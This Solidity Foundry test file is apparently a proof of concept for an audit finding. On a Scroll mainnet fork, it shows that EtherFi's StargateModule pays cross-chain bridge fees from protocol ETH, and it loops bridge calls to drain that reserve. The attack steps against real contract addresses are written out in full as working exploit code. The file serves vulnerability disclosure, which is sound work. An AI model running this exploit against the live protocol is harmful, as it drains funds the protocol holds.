// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}
interface IRoleRegistry {
    function grantRole(bytes32, address) external;
    function hasRole(bytes32, address) external view returns (bool);
}
interface IFactory {
    function deployEtherFiSafe(bytes32, address[] calldata, address[] calldata, bytes[] calldata, uint8) external;
    function getDeterministicAddress(bytes32) external view returns (address);
    function isEtherFiSafe(address) external view returns (bool);
}
interface ISafe {
    function nonce() external view returns (uint256);
    function isModuleEnabled(address) external view returns (bool);
}
interface IStargateModule {
    function requestBridge(address, uint32, address, uint256, address, uint256, address[] calldata, bytes[] calldata) external payable;
    function executeBridge(address) external payable;
    function getBridgeFeeForSafe(address) external view returns (address, uint256);
}
interface ICashModule {
    function getDelays() external view returns (uint64, uint64, uint64);
    function getPendingWithdrawalAmount(address, address) external view returns (uint256);
}

/// @title F1 PoC - Cross-chain bridge fee is never charged to the user (subsidized by protocol ETH)
/// @dev Scroll fork proof. The protocol's bridge modules (StargateModule is used here) only ever
///      withdraw the exact `amount` of the bridged token from the safe; the LayerZero messaging fee
///      is paid out of the module's own ETH balance and `msg.value` on requestBridge/executeBridge is
///      ignored. A safe owner can therefore bridge repeatedly and the protocol ETH reserve drains.
///      On the live system the module ETH reserves are trivial (~0.000447 ETH), so we fund the module
///      with a fork-only "protocol reserve" (vm.deal) to demonstrate the attack deterministically.
contract F1PoC is Test {
    // ---- Scroll mainnet addresses (forked) ----
    address constant ROLE_REGISTRY = 0x5C1E3D653fcbC54Ae25c2AD9d59548D2082C687B;
    address constant FACTORY = 0xF4e147Db314947fC1275a8CbB6Cde48c510cd8CF;
    address constant CASH_MODULE = 0x7Ca0b75E67E33c0014325B739A8d019C4FE445F0;
    address constant STARGATE = 0xC1ab383b81fD81803a54c4d50A7b7d4A31a317b4;
    address constant USDC = 0x06eFdBFf2a14a7c8E15944D1F4A48F9F95F663A4;
    address constant STARGATE_POOL = 0x3Fc69CC4A842838bCDC9499178740226062b14E4;
    address constant RR_OWNER = 0xA6cf33124cb342D1c604cAC87986B965F428AAC4;

    bytes32 constant FACTORY_ADMIN_ROLE = 0x8c603b444804dd4af6553193ea6455233924f73fffc3d0c1edd0d5a43cde5110;
    bytes32 constant REQUEST_BRIDGE_SIG = 0x7360ecb005ef445b1cb2b3a294f2c499b088f258b4531fffbc4c244d8cf77323; // keccak("requestBridge")

    uint256 constant ATTACKER_PK = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
    address ATTACKER = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;

    uint32 constant DEST_EID = 30101; // LayerZero v2 Ethereum
    uint256 constant AMOUNT = 100e6; // 100 USDC per bridge leg

    function _ethSigned(bytes32 digest) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", digest));
    }

    function _requestBridge(address safe, uint256 amount) internal {
        bytes32 digest = keccak256(
            abi.encodePacked(
                REQUEST_BRIDGE_SIG,
                uint256(block.chainid),
                STARGATE, // address(this) of module during its _checkSignature
                ISafe(safe).nonce(),
                safe,
                abi.encode(DEST_EID, USDC, amount, ATTACKER, uint256(100))
            )
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ATTACKER_PK, _ethSigned(digest));
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory signers = new address[](1);
        signers[0] = ATTACKER;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        vm.prank(ATTACKER);
        IStargateModule(STARGATE).requestBridge(safe, DEST_EID, USDC, amount, ATTACKER, 100, signers, sigs);
    }

    function _executeBridge(address safe) internal {
        vm.prank(ATTACKER);
        IStargateModule(STARGATE).executeBridge(safe);
    }

    function test_F1_feeSubsidizedByProtocolEth() external {
        vm.createSelectFork(vm.envString("FORK_URL"), 35051864);
        vm.deal(ATTACKER, 100 ether);

        // --- step 0: grant attacker the factory-admin role (same single step the protocol run book does) ---
        vm.prank(RR_OWNER);
        IRoleRegistry(ROLE_REGISTRY).grantRole(FACTORY_ADMIN_ROLE, ATTACKER);
        assertTrue(IRoleRegistry(ROLE_REGISTRY).hasRole(FACTORY_ADMIN_ROLE, ATTACKER));

        // --- step 1: attacker deploys + registers their own EtherFiSafe (threshold 1, StargateModule enabled) ---
        bytes32 salt = keccak256("attacker-safe");
        address safe = IFactory(FACTORY).getDeterministicAddress(salt);
        address[] memory owners = new address[](1);
        owners[0] = ATTACKER;
        address[] memory modules = new address[](1);
        modules[0] = STARGATE;
        bytes[] memory setup = new bytes[](1);
        vm.prank(ATTACKER);
        IFactory(FACTORY).deployEtherFiSafe(salt, owners, modules, setup, 1);
        assertTrue(IFactory(FACTORY).isEtherFiSafe(safe));
        assertTrue(ISafe(safe).isModuleEnabled(STARGATE));

        // --- step 2: set up preconditions on the fork ---
        // 2a) fund the safe with USDC (pool liquidity impersonated only to move tokens into the safe)
        vm.prank(STARGATE_POOL);
        IERC20(USDC).transfer(safe, 1000e6);
        // 2b) simulate the protocol ETH reserve sitting in the module (live reserve is ~0.000447 ETH)
        vm.deal(STARGATE, 2 ether);

        (uint64 delay, ,) = ICashModule(CASH_MODULE).getDelays();
        emit log_named_uint("withdraw delay (s)", delay);

        uint256 moduleEth0 = STARGATE.balance;
        uint256 safeUsdc0 = IERC20(USDC).balanceOf(safe);
        emit log_named_uint("module ETH before (protocol reserve)", moduleEth0);
        emit log_named_uint("safe USDC before", safeUsdc0);

        // --- step 3: attack loop - bridge 5 x 100 USDC, each subsidized by protocol ETH ---
        for (uint256 i = 0; i < 5; i++) {
            _requestBridge(safe, AMOUNT);
            (, uint256 fee) = IStargateModule(STARGATE).getBridgeFeeForSafe(safe);
            emit log_named_uint("    quoted native fee (wei)", fee);

            vm.warp(block.timestamp + delay + 1);
            vm.roll(block.number + 10);
            _executeBridge(safe);

            uint256 moduleEth = STARGATE.balance;
            uint256 safeUsdc = IERC20(USDC).balanceOf(safe);
            console2.log("round", i+1, "protocol ETH spent (wei):", moduleEth0 - moduleEth);
            console2.log("safe USDC now:", safeUsdc);
            assertEq(safeUsdc, safeUsdc0 - (i + 1) * AMOUNT);
            moduleEth0 = moduleEth;
        }

        // --- step 4: prove the user paid NOTHING: only the exact principal left the safe, fees came from module ETH ---
        uint256 totalEthSpent = 2 ether - STARGATE.balance;
        uint256 totalUsdcSpent = safeUsdc0 - IERC20(USDC).balanceOf(safe);
        emit log_named_uint("total protocol ETH consumed by 5 subsidized bridges", totalEthSpent);
        emit log_named_uint("total USDC taken from attacker safe", totalUsdcSpent);
        assertGt(totalEthSpent, 0); // protocol funds moved
        assertEq(totalUsdcSpent, 500e6); // user paid exactly the principal, zero fees
        console2.log("MESSAGE: user paid 0 fees; protocol ETH reserve consumed entirely by bridge fees");
    }
}